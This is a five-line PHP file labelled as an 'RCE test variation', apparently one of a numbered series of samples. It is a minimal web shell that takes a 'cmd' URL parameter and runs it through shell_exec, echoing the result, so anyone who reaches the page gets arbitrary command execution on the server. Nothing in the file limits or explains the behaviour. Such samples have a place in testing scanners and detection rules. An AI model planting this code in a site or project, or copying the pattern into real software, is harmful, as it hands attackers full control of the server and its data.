<?php
// RCE test variation #841
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>